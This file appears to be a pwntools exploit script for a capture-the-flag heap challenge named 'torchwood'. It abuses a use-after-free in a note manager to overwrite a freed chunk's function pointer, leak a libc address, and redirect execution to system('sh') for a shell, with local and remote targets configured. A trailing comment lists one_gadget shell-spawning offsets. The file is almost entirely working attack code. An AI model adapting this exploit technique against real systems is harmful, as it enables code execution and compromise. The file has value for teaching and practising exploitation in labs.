#coding=utf-8
from pwn import *
local = 1
context.terminal=["tmux","splitw","-h"]
#context.log_level="debug"
if local :
    a=process("./torchwood")
    libc=ELF("/lib/i386-linux-gnu/libc.so.6")
else:
    a=remote("172.1.14.9","8888")
    libc=ELF("/lib/i386-linux-gnu/libc.so.6")

elf=ELF("./torchwood")
def debug():
    gdb.attach(a,'''
    b *(0x8048924)
    b *0x8048723
    b *0x804875C
    ''')
    #malloc 
def menu(index):
    a.recvuntil("CNote > ")
    a.sendline(str(index))
def add(index,type,size,content):
    menu(1)
    a.recvuntil("Index > ")
    a.sendline(str(index))
    a.recvuntil("Type > ")
    a.sendline(str(type))
    if type == 2:
        a.recvuntil("Length > ")
        a.sendline(str(size))
        a.recvuntil("Value > ")
        a.sendline(content)
    else:
        a.recvuntil("Value > ")
        a.sendline(str(content))
def delete(index):
    menu(2)
    a.recvuntil(" > ")
    a.sendline(str(index))
def show(index):
    menu(3)
    a.recvuntil(" > ")
    a.sendline(str(index))
#chunk_info 16byte
#
str_print=0x80486DE
str_free=0x8048725
add(0,2,0x40,"1")#0
add(1,2,0x40,"1")#1
add(2,1,0x40,1)#2 防止合并
delete(0)
delete(1)
add(3,2,12,p32(str_print))#3
show(0)
a.recvuntil("String, Value=")
libc_base=u32(a.recv(4))-libc.symbols["__malloc_hook"]-0x18-48
success("libc_base ==> 0x%x"%libc_base)
system_addr=libc_base+libc.symbols["system"]
delete(3)
add(4,2,12,"sh\x00\x00"+p32(system_addr))
delete(0)

a.interactive()

'''
wxy@ubuntu:/mnt/hgfs/Desktop/xianxia/pwn3$ one_gadget /lib/i386-linux-gnu/libc.so.6
0x3ac5c execve("/bin/sh", esp+0x28, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x28] == NULL

0x3ac5e execve("/bin/sh", esp+0x2c, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x2c] == NULL

0x3ac62 execve("/bin/sh", esp+0x30, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x30] == NULL

0x3ac69 execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x34] == NULL

0x5fbc5 execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL

0x5fbc6 execl("/bin/sh", [esp])
constraints:
  esi is the GOT address of libc
  [esp] == NULL

'''